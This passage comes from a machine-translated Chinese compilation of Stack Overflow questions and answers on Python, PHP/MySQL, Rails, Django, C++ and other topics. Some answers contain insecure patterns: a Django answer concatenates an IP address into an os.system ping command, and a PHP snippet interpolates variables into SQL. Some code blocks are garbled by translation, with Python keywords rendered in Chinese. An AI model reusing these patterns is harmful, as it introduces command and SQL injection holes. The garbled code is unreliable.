...        pass
... 
>>> f2(1),f2(2)
(None, 2) 
```

因此，无论您如何编写它们，它们在功能上都是相同的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-09-05T09:12:20.777

正如其他人在上面提到的，在你的情况下它总是会返回 None 。但是，如果您不想返回 None 类型，则可以将其替换为空格

```
定义测试（x）：
    如果 x >1：
        返回（x）
    别的：
        返回打印（''）

```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-04-24T18:49:40.897

You can use lambda function with filter to return a list of values that pass if condition.

Example:

```
 myList = [1,20,5,50,6,7,2,100]
    result = list(filter(lambda a: a if a<10 else None, (item for item in myList)))
    print(result) 
```

Output:

```
 [1,5,6,7,2] 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2022-02-05T20:48:10.793

只是为了添加所有答案，不返回函数的唯一实际方法是引发异常。至少，只要程序需要运行，即使没有返回任何东西。

所以你的代码可以是：

```
def f(x):
    if x>1:
        return x
    raise Exception 
```

（请注意，我没有使用`else`块来引发异常，因为如果满足条件，它已经返回值。但是，您也可以在`else`块中执行此操作）

试运行时：

```
num1 = f(2)    # 2
num2 = f(0)    # Unbound; and error raised 
```

现在，如果您还想在某些条件下继续返回`None`选项，而在某些其他条件下不返回任何内容，这将很有用：

```
def f(x):
    if x > 0:
        return x
    elif x == 0:
        return None  # pass
    raise Exception

>>> num1 = f(1)  # 1
>>> num2 = f(0)  # None
>>> num3 = f(-1) # Unbound; and error raised 
```

* * *

如果您不希望程序退出并显示错误，您可以让它在函数之外捕获异常：

```
try:
    num = f(0)
except:
    pass 
```

这样，如果`f(0)`发生异常（它会），它将被捕获为`except`块，您可以愉快地继续程序，请放心，`num`不是`None`，而是简单地未绑定。

* * *

**一个有趣的事实：**

不返回任何东西的唯一另一种方法可能是简单地退出程序，这就是做什么`exit()`和`quit()`做什么。当我在我的代码编辑器中检查返回类型时`exit()`，`quit()`它会显示我`NoReturn`，这与它显示`None`的常规函数​​不同:)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-12-20T14:26:27.333

您可以在没有字符的情况下使用返回`chr(0)` 原因，因此将其留空`0``ASCII`

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-06-16T00:09:00.827

我可能有一个提示给你！如果没有返回值，编写 print(f(x)) 将输出 None ，但如果你只是在没有'print'的情况下调用你的函数，而是在函数中写入一些'print(s)'，你将不会有无值

# elasticsearch - 设置索引字段为 not_analyzed 再做通配符查询，会不会显得性能低下？

> ID：15650617
> 
> 赞同：-1
> 
> 时间：2013-03-27T01:45:44.790
> 
> 标签：elasticsearch

设置索引字段为 not_analyzed 再做通配符查询，会不会显得性能低下？......有什么问题导致它出现性能低下？？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T11:13:32.530

是的。通配符查询效率不高。

倒排索引工作得很好，因为它里面有一个你想搜索的词条。但是，您的通配符查询并未按预期使用倒排索引。

例如，如果您搜索`"foo*"`它必须找到倒排索引中以 开头的所有术语`"foo"`，然后搜索所有这些术语。这可能非常缓慢且占用大量内存。

如果您知道要进行通配符搜索，那么您应该相应地分析您的数据。使用 ngram 或 edge-ngram 分词器来分析您的字段，以便索引部分匹配。这将允许倒排索引按预期运行。

# c++ - Directx 11：在 MS Visual Studio 2010 的输出调试窗口上打印错误消息

> ID：15650618
> 
> 赞同：1
> 
> 时间：2013-03-27T01:45:51.557
> 
> 标签：c++, directx-11

我有一个关于如何在 MS Visual 2010 上打印错误消息的问题。我正在使用 DirectX 11 和 CUDA 编写应用程序。对 cudaGraphicsMapResources(nbResources, ppResources, stream) 的 CUDA 函数调用引发错误。我有一个打印错误消息的功能，但在输出调试窗口上没有打印任何内容。以下是打印错误信息的函数：

```
inline void __getLastCudaError( const char *errorMessage, const char *file, const int line )
{
    cudaError_t err = cudaGetLastError();
    if( cudaSuccess != err) {
        fprintf(stderr, "%s(%i) : getLastCudaError() CUDA error : %s : (%d) %s.\n",
                file, line, errorMessage, (int)err, cudaGetErrorString( err ) );
        exit(-1);
    }
} 
```

如何使此功能在 DirectX 11 中正常工作？此函数应在输出窗口上打印错误语句。

# php - 未隐藏的预匹配表单字段，仅检索名称

> ID：15650620
> 
> 赞同：0
> 
> 时间：2013-03-27T01:45:57.667
> 
> 标签：php, regex

我正在尝试扫描表单，只提取不是 type="hidden" 的字段并检索它们的 name="" 值，我目前正在使用

`@<input.*?>@`

它为我检索以下内容，

```
(
[0] => Array
    (
        [0] => <input type="email" id="Contact0Email" name="email" class="field" onfocus="if ($(this).val() == $(this).attr('title')) { $(this).val('') }" onblur="if ($(this).val()=='') { $(this).val($(this).attr('title'));}" title="Enter a valid email here" value="Enter a valid email here">
        [1] => <input type="submit" class="submit" value="Get Instant Access">
    ) 
```

但是我不需要所有代码，我必须进一步扫描以获得我需要的东西，任何人都可以建议我应该使用什么正则表达式来获得我需要的东西？在此示例中，没有隐藏字段，但可能还有其他一些我需要运行它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:18:40.687

这是适合您的快速而肮脏的解决方案：

```
$string = '<form name="input" action="html_form_action.asp" method="get">
<input type="hidden" name="foo" value="123"/>
Username: <input type="text" name="user" value="Ralph">
Pass: <input type="text" name="pass">
<input type="submit" value="Submit">
</form>';

$doc = new DOMDocument();
$doc->loadHTML($string);

$input = $doc->getElementsByTagName('input');

for ($i = 0; $i < $input->length; $i++) {

    $el = $input->item($i);

    if ($el->getAttribute('type') === 'hidden'
      || $el->getAttribute('type') === 'submit') continue;

    echo $el->getAttribute('name')
        .':'.$el->getAttribute('value')."\n";

} 
```

# java - 无法在 Java 中释放 URL 资源

> ID：15650624
> 
> 赞同：1
> 
> 时间：2013-03-27T01:46:17.107
> 
> 标签：java, resources

作为我的单元测试的一部分，我需要创建一些 JAR 文件，对它们执行操作，然后删除它们（这样文件夹对于下一个测试是干净的）。

我的一项操作是通过查看这些测试文件夹中的 jar 文件清单来枚举资源。

```
manifests = _loader.getResources(MANIFEST_PATH);
while (manifests.hasMoreElements())
    {
        manifests.nextElement();
        //do some stuff here

    } 
```

如果我注释掉 manifests.nextElement()，每次都会按预期删除所有内容。如果我把它留在里面，它搜索的 jar 文件不会被删除。

我尝试获取 URL 并关闭流，但这没有帮助。我查看了 SO 上的资源模式，但我是 Java 新手，不确定是哪个资源导致了问题。

感谢您的任何帮助。

# ruby-on-rails - 如何将 Wrap Bootstrap 主题集成到 Rails 应用程序中？

> ID：15650627
> 
> 赞同：14
> 
> 时间：2013-03-27T01:46:34.963
> 
> 标签：ruby-on-rails, twitter-bootstrap, ruby-on-rails-3, ruby-on-rails-4, twitter-bootstrap-rails

我从[wrapbootstrap](https://wrapbootstrap.com/)购买了一个 twitter bootstrap 主题。我已经有一个功能性的 Rails 应用程序。现在，我想通过将引导主题集成到我的应用程序中来设计我的应用程序。我是新手，我不知道该怎么做。在对此进行了大量研究之后，我发现关于这个问题的讨论很少。例如，我发现了这篇文章：[将 WrapBootstrap 主题实现到 Rails 应用程序中](https://stackoverflow.com/questions/14175879/implementing-wrapbootstrap-theme-into-rails-app)

但是，我不完全确定主题中的资产将如何应用于我的应用程序。我已经从主题的相应文件夹中复制了我项目的`app/assets/images`,`app/assets/javascripts`和文件夹下的所有资产。`app/assets/stylesheets`然后，当我尝试在本地运行我的应用程序时出现了几个错误。我删除了我的`application.css`文件，之后它开始工作。但是，我还看不到应用主题的任何设计。我应该怎么做才能使这个主题在我的 Rails 应用程序中工作？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-27T03:05:01.190

First check this screencast:

[http://railscasts.com/episodes/328-twitter-bootstrap-basics](http://railscasts.com/episodes/328-twitter-bootstrap-basics)

then I would add a bootstrap gem like bootstrap-sass, then add the JS files through the gem by adding them to the manifest, something like this:

```
//= require jquery
//= require jquery_ujs
//= require bootstrap
//= require_tree . 
```

then i would get the css files that you bought from wrapboostrap and place them in you assets/stylesheets folder, then add the necesary markup and clases to your app this is how ive done it before.

hope it helps

EDIT:

Markup:

Check the template you downloaded, lets start with the navbar for example

Code from template:

```
<header>
    <div class="navbar navbar-fixed-top">
        <div class="navbar-inner">
            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </a>
            <div class="container">
                <a class="brand" href="index.html">Gaia Business</a>
                <div class="nav-collapse">
                    <ul class="nav">
                        <li class="active"><a href="index.html">Home</a></li>
                        <li><a href="about.html">About</a></li>
                        <li><a href="service.html">Service</a></li>
                        <li><a href="faq.html">FAQ</a></li>
                        <li><a href="contact.html">Contact</a></li>
                        <li class="dropdown">
                          <a href="#" class="dropdown-toggle" data-toggle="dropdown">Dropdown <b class="caret"></b></a>
                          <ul id="dropdown-menu" class="dropdown-menu">
                            <li><a href="#">Dropdown 1</a></li>
                            <li><a href="#">Dropdown 2</a></li>
                            <li><a href="#">Dropdown 3</a></li>
                            <li class="divider"></li>
                            <li class="nav-header">Nav header</li>
                            <li><a href="#">Dropdown 4</a></li>
                            <li><a href="#">Dropdown 5</a></li>
                          </ul>
                        </li>
                    </ul>
                </div><!-- /.nav-collapse -->
            </div><!--/.container-->
        </div><!-- /navbar-inner -->
    </div>
</header><!--/header--> 
```

Now you need to place yourself in your app, if the navbar shows in every view on your app, you should mention it on the layouts/application.html.erb something like this:

```
<!DOCTYPE html>
<html>
<head>
  <title>Golden Green Chlorella</title>
  <%= stylesheet_link_tag    "application", :media => "all" %>
  <%= javascript_include_tag "application" %>
  <%= csrf_meta_tags %>

</head>
<body>

<%= render :partial => 'layouts/navbar' %>
<%= yield %>
</body>
</html> 
```

and last, do your navbar partial

_navbar.html.erb:

```
<header>
    <div class="navbar navbar-fixed-top">
        <div class="navbar-inner">
            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                <span class="icon-bar glyph"></span>
                <span class="icon-bar glyph"></span>
                <span class="icon-bar glyph"></span>
            </a>
            <div class="container">
                <%= link_to "Your app", root_path, :class => "brand" %> 
                <div class="nav-collapse">
                    <ul class="nav">
                        <li class=<%= current_page?(static_index_path) || current_page?(root_path) ? "active" : "" %> > <%= link_to (t "navbar.home"), root_path%></li>
                        <li class=<%= current_page?(static_know_path) ? "active" : "" %>> <%= link_to (t "navbar.know"), static_know_path%></li>  
                        <li class=<%= current_page?(static_buy_path) ? "active" : "" %>> <%= link_to (t "navbar.buy"), static_buy_path%></li>                       
                        <li class=<%= current_page?(static_faq_path) ? "active" : "" %>> <%= link_to "FAQ", static_faq_path%></li>           
                        <li class=<%= current_page?(static_contact_path) ? "active" : "" %>> <%= link_to (t "navbar.contact"), static_contact_path%></li>

                        <!-- <li class="active"><a href="index.html">Home</a></li> -->
                    </ul>
                    <ul class="nav pull-right">
                        <li><%= link_to "English", static_english_path%></li>
                        <li><%= link_to "Español", static_spanish_path%></li>
                    </ul> 
                </div><!-- /.nav-collapse -->
            </div><!--/.container-->
        </div><!-- /navbar-inner -->
    </div>
</header><!--/header--> 
```

That was only for the navbar, now you need to do the rest, add the markup your template shows you to do, with all your app, its not an easy job, but thats how its done.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-06-06T07:19:07.113

确保在安装 twitter bootstrap 时，您应该在“group :assets”下将以下 gem 添加到您的 Gemfile 中

```
gem 'therubyracer'
gem 'less-rails'
gem 'twitter-bootstrap-rails' 
```

然后运行捆绑命令。

现在，您下载的主题“file_name.css”（file_name 可以是任何名称）只需将其添加到 app->assets->stylesheets 下的“stylesheets”文件夹中

然后在同一个文件夹中打开你的 application.css 文件，你会看到

```
*= require_tree. 
```

将此行替换为

```
*= require "file_name.css" 
```

注意：不要忘记重新编译您的资产或简单地删除 tmp/cache 文件夹的内容。

保存并重新启动服务器。它将应用您的新主题。

# windows-7 - Word 2007 OLE 锁定文件并且不会关闭

> ID：15650637
> 
> 赞同：1
> 
> 时间：2013-03-27T01:48:13.150
> 
> 标签：windows-7, ms-word, locking, 64-bit, ole

我的应用程序识别剪贴板上的 RTF，并且“粘贴”将该 RTF 保存到临时 RTF 文件中。然后我使用`COleClientItem::CreateFromFile`将数据嵌入为 OLE RTF 文档（由 Word 呈现）。然后我尝试删除临时文件。

在 WinXP / Office 2003 这一切都很好。自从我迁移到 Win7(x64)/Office 2007 后，Word 一直在徘徊，锁定了临时 RTF 文件。`COleClientItem::Close`不做任何事情。无论如何我可以阻止Word锁定文件以便我可以删除它？（如果我能正确整理的话，我不介意 Word 闲逛那么多）。

# sql - 如何构建查询以显示自动递增的数字？

> ID：15650638
> 
> 赞同：2
> 
> 时间：2013-03-27T01:48:22.913
> 
> 标签：sql

如何构建查询以显示自动递增的数字？

我有一个查询，`select * from data`结果是：

```
Name    State  
a       malaysia  
b       Indonesia 
```

我要这个：

```
No      Name    State  
1       a       malaysia  
2       b       Indonesia 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T01:53:03.077

```
SELECT Name
, State
, RANK() OVER (ORDER BY Name, State) as Ranking
FROM Data 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:03:58.523

既然你没有说在什么数据库中，就让它成为 PostgreSQL：

选择 0+row_number() OVER(ORDER BY name DESC) 作为位置，* from test.users ORDER BY name

这在其他数据库中可能会有所不同（肯定会）。思路应该是一样的，这样一来你就知道怎么做了。在其他一些地方应该很容易做到。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:55:04.320

我不知道是否有与数据库无关的方式。

Oracle 允许您将 rownum ( [http://www.adp-gmbh.ch/ora/sql/rownum.html](http://www.adp-gmbh.ch/ora/sql/rownum.html) ) 声明为要返回的列。

H2 也支持这种语法

答案可能取决于您使用的数据库的风格。

# php - 使用变量使用 php 更新 mysql 数据库

> ID：15650642
> 
> 赞同：0
> 
> 时间：2013-03-27T01:48:41.210
> 
> 标签：php, mysql

我在使用 varables 用 php 更新 mysql 时遇到问题。

```
 mysqli_query($connection,  "UPDATE passwords SET used=1, time_used='{$time}'
                                WHERE password='{$key}'
                               "); 
```

我得到了错误：

```
Warning: mysqli_query() expects parameter 1 to be mysqli, resource given in C:\wamp\www\key_check.php on line 47 
```

任何想法为什么？

谢谢！

编辑：整个代码：[http ://pastebin.com/raw.php?i=W5cx8pBP](http://pastebin.com/raw.php?i=W5cx8pBP)

“新的 mysqli”解决方案似乎在尝试

```
$result = mysql_query("SELECT * FROM passwords", $connection); 
```

谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:50:44.593

您的连接设置必须如下所示

```
$connection = new mysqli($host,$username,$pass,$db); 
```

然后使用您的方式或通过这种方式执行查询

```
$query="UPDATE passwords SET used=1, time_used='{$time}'
                            WHERE password='{$key}'
                           ";
$stmt = $connection->query($sql); 
```

*注意：为 mysqli 使用准备好的语句也是可能的，而且很棒。通过某种方式，您还需要在其中绑定参数..*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:53:19.197

您必须通过创建一个新的 mysqli 对象来声明 $connection。如果你没有这样做，你可以查看[mysqli 构造函数的文档](http://php.net/manual/en/mysqli.construct.php)

这是文档中的代码。

```
$connection = new mysqli('localhost', 'my_user', 'my_password', 'my_db');

if ($connection->connect_error) {
    die('Connect Error (' . $connection->connect_errno . ') '
            . $connection->connect_error); 
```

# java - 如何编辑特定 JButton 的数据

> ID：15650643
> 
> 赞同：0
> 
> 时间：2013-03-27T01:48:43.050
> 
> 标签：java, swing, layout, multidimensional-array, jbutton

我有这个代码：

```
 JButton[][] grid;
    grid = new JButton[15][13];
    for (int x = 0; x < 15; x++) {
        for (int y = 0; y < 13; y++) {
            grid[x][y] = new JButton("(" + x + "," + y + ")");
            frame.add(grid[x][y]);
        }
    } 
```

我的问题是，如何编辑特定的 JButton？假设我想在 [2][2] 处向 JButton 添加不同的文本。最终，我想在按钮中添加动作监听器等其他东西，但我的主要问题是如何访问特定按钮。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:54:00.517

您可以只使用`grid[2][2]`来获取按钮，就像访问普通的二维数组一样。

# php - 货币符号冲突的价格验证字段

> ID：15650644
> 
> 赞同：0
> 
> 时间：2013-03-27T01:48:43.620
> 
> 标签：php

我把美元放在每个价格（数字）之前

```
 $Product_Price="USD".mysql_real_escape_string($_POST['product_price']); 
```

现在我将其验证为

```
if(!is_numeric($Product_Price))
        {
            $Errormessage[]="Price must be in numbers";
        } 
```

它运行 if 语句。我如何才能以每个价格获得美元，但对于用户来说，应该限制他只能添加数字。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:52:36.230

您可以在添加“USD”前缀之前检查该值是否为数字。

像这样...

```
if(is_numeric($Product_Price))
{
    $Product_Price="USD".mysql_real_escape_string($_POST['product_price']);
}
else
{
    $Errormessage[]="Price must be in numbers";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:56:49.930

```
$price = mysql_real_escape_string($_POST['product_price']);
$currency = mysql_real_escape_string($_POST['product_currency']);

if (is_numeric($price))
{
  // insert price and currency in separate columns
}
else
{
  // error message
} 
```

# javascript - ajax $.get 回调报告为未定义

> ID：15650647
> 
> 赞同：1
> 
> 时间：2013-03-27T01:48:53.397
> 
> 标签：javascript, jquery, ajax

我已经定义了一个 div，其中基于 PHP 通过 ajax $.get 调用返回的 MySQL 表数据附加了一个具有默认输入值的表单。

div 看起来像：

```
<div id="esfContainer1">
</div> <!--end esfContainer1 div--> 
```

div 相对于 body 标签是绝对定位的。

与表单验证关联的脚本在包含在调用表单的主页上时中断，因此我将其移至 PHP 输出 $formContent。

这是 PHP 输出中包含的表单验证和提交脚本：

```
<script type="text/javascript">

var senderName     = $("#sendName");
var senderEmail    = $("#fromemailAddress");
var recipientEmail = $("#toemailAddress");
var emailError     = $("#esemailerrorDiv");

senderName.blur(checkName);
senderEmail.blur(checkSEmail);
recipientEmail.blur(checkREmail);

function checkName() {
if (senderName.val() == "YOUR NAME") {
        $("#esemailerrorText").html("Please provide your name");
        $(emailError).removeClass("esemailError");
        $(emailError).addClass("esemailErrorNow");
        $(emailError).fadeIn("fast","linear");
        $(emailError).delay(2000).fadeOut("slow","linear");
        return false;
    } else {
        return true;
    }
};

function checkSEmail() {
    var a      = senderEmail.val();
    var filter = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;

    if (filter.test(a)) {
        return true;
    } else {
        $("#esemailerrorText").html("Please enter a valid email address");
        $(emailError).removeClass("esemailError");
        $(emailError).addClass("esemailErrorNow");
        $(emailError).fadeIn("fast","linear");
        $(emailError).delay(2000).fadeOut("slow","linear");
        return false;
    }
};

function checkREmail() {
    var a      = recipientEmail.val();
    var filter = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;

    if (filter.test(a)) {
        return true;
    } else {
        $("#esemailerrorText").html("Your friend\'s email is invalid");
        $(emailError).removeClass("esemailError");
        $(emailError).addClass("esemailErrorNow");
        $(emailError).fadeIn("fast","linear");
        $(emailError).delay(2000).fadeOut("slow","linear");
        return false;
    }
};

$("#emailForm").submit (function() {
    if (checkName() && checkSEmail() && checkREmail()) {

        var emailerData = $("#emailForm").serialize();
        $.get("style.php",emailerData,processEmailer).error("ouch");

        function processEmailer(data) {
            if (data=="fail") {
                return false;
            } else if (data=="pass") {
                $("#c1Wrapper").fadeOut("slow","linear");
                $("#confirmation").fadeIn("slow","linear");
                $("#esfContainer1").delay(2000).fadeOut("slow","linear");
                $("#backgroundOpacity").delay(2000).fadeOut("slow","linear");
                return false;
            }
        };
    return false;
    };
    return false;
}); 
```

我已经用“return false;”对上面的提交函数进行了轰炸。因为提交函数只是简单地打开处理 PHP 脚本而不是执行 $.get。使用 Firebug 观察提交函数报告 processEmailer 未定义。

我对此很陌生。我假设因为在提交函数中定义了 ajax 回调（并且 processEmailer 函数直接在 ajax 调用下面定义），所以定义不会有问题。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:13:42.810

你被[函数语句](http://kangax.github.com/nfe/#function-statements)困住了。函数声明（将被提升）不允许在块内（if/else/for 主体），如果它们出现在那里，则行为未定义。Firefox 有条件地定义它们，在你的情况下，*在*你在`$.get`调用中使用它之后 - 它当时在哪里`undefined`- 就像在[`var functionName = function() {}`vs`function functionName() {}`](https://stackoverflow.com/q/336859/1048572)中一样。

为了解决这个问题，简单地将它放在 if 块之外（甚至在整个回调之外）。顺便说一句，`.error("ouch")`不行，你需要传递一个函数。

```
$("#emailForm").submit (function() {
    if (checkName() && checkSEmail() && checkREmail()) {
        var emailerData = $("#emailForm").serialize();
        $.get("style.php",emailerData).done(processEmailer).fail(function() {
            console.log("ouch");
        });
    }
    return false;

    // now a proper function declaration, will be hoisted:
    function processEmailer(data) {
        if (data=="fail") {
            return false;
        } else if (data=="pass") {
            $("#c1Wrapper").fadeOut("slow","linear");
            $("#confirmation").fadeIn("slow","linear");
            $("#esfContainer1").delay(2000).fadeOut("slow","linear");
            $("#backgroundOpacity").delay(2000).fadeOut("slow","linear");
            return false;
        }
    }
}); 
```

# c++ - C++ 共享指针问题

> ID：15650649
> 
> 赞同：3
> 
> 时间：2013-03-27T01:49:06.633
> 
> 标签：c++, pointers, shared-ptr

我正在尝试创建一个 set 函数，它将接收一个共享指针并将其设置为等于另一个共享指针。

这是我在头文件中声明的共享指针和设置函数

```
class Shape
{
public:
    Shape();
    Gdiplus::Point start;   
    Gdiplus::Point end;

    std::shared_ptr<Gdiplus::Pen> m_pen;

    virtual  LRESULT Draw(Gdiplus::Graphics * m_GraphicsImage) = 0;

    void setPen(std::shared_ptr<Gdiplus::Pen> pen2);

    void setStart(int xPos, int yPos);
    void setEnd(int xCor, int yCor);
}; 
```

但是当我尝试在我的 cpp 中实现它时，我收到一条错误消息，说我的“声明与 .h 上声明的 void setPen 不兼容”。它还说 m_pen 在我的 cpp 文件中未定义。

```
#include<memory>
 #include "stdafx.h"
#include "resource.h"

  #include "ShapeMaker.h"
void Shape::setPen(std::shared_ptr<Gdiplus::Pen> pen2)
{
    m_pen = pen2;
}

void Shape::setStart(int xPos, int yPos)
{
    start.X = xPos;
    start.Y = yPos;
}

void Shape::setEnd(int xCor, int yCor)
{
    end.X= xCor;
    end.Y = yCor;
} 
```

这就是我所拥有的一切。stdax.h 包括

```
 #include <atlwin.h>

  #include <atlframe.h>
  #include <atlctrls.h>
  #include <atldlgs.h>
  #include <atlctrlw.h>
  #include <atlscrl.h>

  #include <GdiPlus.h> 
```

我得到的错误：

```
shapemaker.h(11): error C2039: 'shared_ptr' : is not a member of 'std'

shapemaker.h(11): error C2143: syntax error : missing ';' before '<'

shapemaker.h(11): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int

shapemaker.h(11): error C2238: unexpected token(s) preceding ';'
.h(16): error C2039: 'shared_ptr' : is not a member of 'std'

shapemaker.h(16): error C2061: syntax error : identifier 'shared_ptr'
shapemaker.cpp(9): error C2511: 'void Shape::setPen(std::tr1::shared_ptr<_Ty>)' : overloaded member function not found in 'Shape' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T03:35:34.530

*I'm posting my answer from the comments for any visitors.*

The problem is at the beginning of the cpp file.

```
#include<memory>
 #include "stdafx.h"
#include "resource.h"

  #include "ShapeMaker.h" 
```

MSVC++ demands that the precompiled header `"stdafx.h"` precede any other code in your source files.

The `#include<memory>` must be removed, and instead placed in `"ShapeMaker.h"` where it is first needed.

# c# - 回发时输入文本控件消失

> ID：15650657
> 
> 赞同：1
> 
> 时间：2013-03-27T01:49:31.420
> 
> 标签：c#, asp.net, user-controls, updatepanel, postback

我以这种方式在代码隐藏中创建了一些输入控件（文本）作为动态 RadiobuttonList 的一部分（以便文本框位于单选按钮旁边）：

```
RadioButtonList radioOption = new RadioButtonList();

 radiobuttonlist.Items.Add(new ListItem(dt.Rows[i][9].ToString() + " <input id=\"" + name + "\" runat=\"server\" type=\"text\" value=\"Enter text\" />") 
```

所有控件都在 UpdatePanel 中。

每次回发时，Input 控件中的文本都会消失。

如何保留输入文本值？

有任何想法吗？非常感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:00:44.303

必须在**每次**回发时重建控制树，包括部分回发 - 或者让它通过 ControlState/ViewState 重建。在这种情况下，在随后的回发中，Items 集合不会被重建（或被清除）并且在 Render 阶段是空的。

对于这样的情况，我会这样处理：

1.  在 RadioButtonList 上启用 ViewState*并*确保在 Load ¹之前添加它，或者；
2.  将适当集合的 ViewState 存储在容器控件上，然后 DataBind 消费控件 - 请参阅[GenericDataSourceControl](http://genericdatasource.codeplex.com/)以了解设置它的干净方法。我更喜欢这种方法，因为它一致、可预测且易于控制。

* * *

¹这*应该*有效，但可能无效。我通常对哪些控件*真正*支持 ViewState 以及在何种程度上使用总是让我觉得......不一致感到困惑。在任何情况下，如果 ViewState 被禁用，它将*不起作用*- 请记住，禁用页面（或父控件）的 ViewState 会一直禁用 ViewState。此外，*必须*在适当的时间将控件加载到控件树中，*并*使用相同的控件路径/ID（通常是 Init 或 Load），以便它与请求 ViewState 一起正确运行。

* * *

＃2的粗略想法：

将视图状态保存在包含的用户控件中（必须为此控件启用 ViewState）：

```
// ListItem is appropriately serializable and works well for
// automatic binding to various list controls.
List<ListItem> Names {
    // May return null
    get { return (List<ListItem>)ViewState["names"]; }
    set { ViewState["names"] = value; }
} 
```

在 GenericDataSourceControl 中（将 GDS 放入标记中，以便它有一个不错的 ID）选择事件：

```
void SelectEvent(sender e, GenericSelectArgs args) {
   args.SetData(Names);
} 
```

动态添加 RadioButtonList（例如，在 中`Control.OnLoad`）：

```
// Unless this NEEDS to be dynamic, move it into the declarative markup.
// The dynamic control must be added to the *same location* it was before the
// postback or there will be ugly invalid control tree creation exceptions.
var radioList = new RadioButtonList();
someControl.Controls.Add(radioList);
// To minimize problem with Control Tree creation this should be unique and
// consistent for dynamic controls.
radioList.ID = "radioList";

// Binding to the DS "declarative" usually works better I've found
radioList.DataSourceID = "idOfTheGDS";
// You -may- need to DataBind, depending upon a few factors - I will usually call
// DataBind in PreRender, but generally in the Load is OK/preferred.
// If it already binds, don't call it manually.
radioList.DataBind(); 
```

如果 DataBinding 工作正常，那么应该可以*禁用*RadioButtonList 的 ViewState .. 但有时在应该使用 ControlState 时使用 ViewState，因此请确保它按需要运行。

# django - Django - 使用 Python Ping 进行模型布尔检查

> ID：15650664
> 
> 赞同：1
> 
> 时间：2013-03-27T01:49:56.527
> 
> 标签：django, ip, boolean, ping, icmp

我目前有一个用于 DSL 连接的有效 DSLAM 管理站点。目前我想要开始工作的是通过自动 ping DSLAM ip 地址来自行更新 DSLAM 状态。如果一个请求是好的，那么它将返回 boolean=True 并保存，否则 boolean=False 并保存。到目前为止它不起作用，不知道从这里去哪里。

# 模型.py

```
from django.db import models
import os,sys

class DslamManager(models.Manager):
    def dslam_status(self, ip_address):
        if os.system('ping' + ip_address):
            dslam_status = super(DslamManager, self).get(ip_address)
            dslam_status = True
            dslam_status.save()
        else:
            dslam_status = super(DslamManager, self)
            dslam_status = False
            dslam_status.save()

class Location(models.Model):
    location_name = models.CharField(max_length=30)
    island_name = models.CharField(max_length=30)

    class Meta:
        ordering = ['location_name']

    def __unicode__(self):
        return self.location_name

class Dslam(models.Model):
    dslam_name = models.CharField(max_length=32)
    ip_address = models.CharField(max_length=128)
    location = models.ForeignKey(Location)
    notes = models.TextField(blank=True)
    dslam_status = models.BooleanField()
    objects = DslamManager()

    class Meta:
        ordering = ['location', 'id']

    def __unicode__(self):
        return self.dslam_name 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T22:17:56.370

我通过将它添加到 ModelAdmin 来解决这个问题。刷新只需要一点时间，但这是因为它试图 ping 一个 IP 地址列表。

```
list_display = ('DSLAM_STATUS',)

def DSLAM_STATUS(self, obj):

    if os.system('ping -w 1 -n 1 ' + obj.ip_address):
        DSLAM_STATUS = False
    else:
        DSLAM_STATUS = True
    return DSLAM_STATUS

DSLAM_STATUS.boolean = True
DSLAM_STATUS.allow_tags = True 
```

这仅在某些时候有效，但我相信 ping ip_address 所需的时间有时太快了。

# python - 包含正则表达式的 webapp2 路由不起作用

> ID：15650671
> 
> 赞同：0
> 
> 时间：2013-03-27T01:50:47.207
> 
> 标签：python, regex, google-app-engine, webapp2

我想在我的一些路由中使用以下正则表达式来启用响应内容的格式：

```
 RedirectRoute(r'/mypath/<:|json|xml>', handler=myhandler, handler_method='mymethod', name='myhandler=mymethod', methods=['POST'], strict_slash=True), 
```

上述代码段所需的功能是：

*   POST /mypath 返回 html
*   POST /mypath/json 返回 application/json
*   POST /mypath/xml 返回应用程序/xml

任何想法如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T13:08:35.433

Route 类[不](http://webapp-improved.appspot.com/guide/routing.html#guide-routing-the-url-template)支持其内部变量之外的正则表达式。所以试试

```
RedirectRoute('/mypath<format:|/xml|/json>', handler=myhandler, handler_method='mymethod', name='myhandler=mymethod', methods=['POST'], strict_slash=True) 
```

您需要做的就是从请求处理程序中接收到的值中去除前导斜杠。

变量的名称`<format:`是必需的，因为`Bad request`如果它是空白 (<:) 在`/mypath/`（带有结尾斜杠）请求的情况下出现错误。当 webapp 尝试创建 URL 以重定向到`/mypath`asstrict_slash=True 时发生错误。我想你有同样的错误。

# javascript - jQuery Mobile & UI - 动画表单字段清晰？

> ID：15650684
> 
> 赞同：1
